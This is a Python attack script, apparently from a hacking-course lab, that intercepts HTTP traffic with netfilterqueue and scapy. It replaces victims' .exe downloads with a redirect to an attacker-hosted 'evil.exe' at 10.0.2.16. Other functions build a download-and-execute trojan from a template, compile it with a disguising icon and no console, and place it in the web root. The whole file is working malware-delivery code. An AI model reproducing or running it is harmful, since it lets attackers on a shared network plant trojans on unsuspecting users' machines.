#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import shutil
import subprocess


ack_list = []
PYINSTALLER = "/root/.wine/drive_c/Python27/Scripts/pyinstaller.exe"
WEB_ROOT = "/var/www/html"

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load and "10.0.2.16" not in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                print(scapy_packet[scapy.Raw].load)
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.16/evil-files/evil.exe\n\n")
                packet.set_payload(str(modified_packet))

    packet.accept()

def generate_trojan(url1, url2):
    with open("download_and_execute.py", "r") as trojan_file_template:
        trojan_code = trojan_file_template.read()
        trojan_code = trojan_code.replace("FRONT_FILE_URL", url1)
        trojan_code = trojan_code.replace("EVIL_FILE_URL", url2)

    with open("trojan.py", "w") as trojan_file:
        trojan_file.write(trojan_code)

def compile_trojan(torjan_name, file_type):
    subprocess.call("wine " + PYINSTALLER + " --onefile --noconsole --icon icons/" + file_type + ".ico trojan.py --name " + torjan_name, shell=True)
    shutil.copyfile(torjan_name, WEB_ROOT)

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
